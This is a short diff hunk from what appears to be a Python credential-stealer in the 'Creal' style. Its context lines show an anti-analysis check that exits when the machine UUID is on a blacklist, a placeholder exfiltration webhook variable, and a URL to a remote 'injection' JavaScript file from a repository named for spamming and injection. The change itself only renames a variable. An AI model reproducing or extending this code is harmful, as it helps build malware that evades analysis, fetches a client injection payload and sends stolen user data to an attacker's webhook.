@@ -47,7 +47,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
 
 wh00k = "WEBHOOK HERE"
-wh00k = ""
+wh00k2 = ""
 inj_url = "https://raw.githubusercontent.com/PeppinUCocchet/SpammerCrealInj3ction/main/index.js"
     
 DETECTED = False
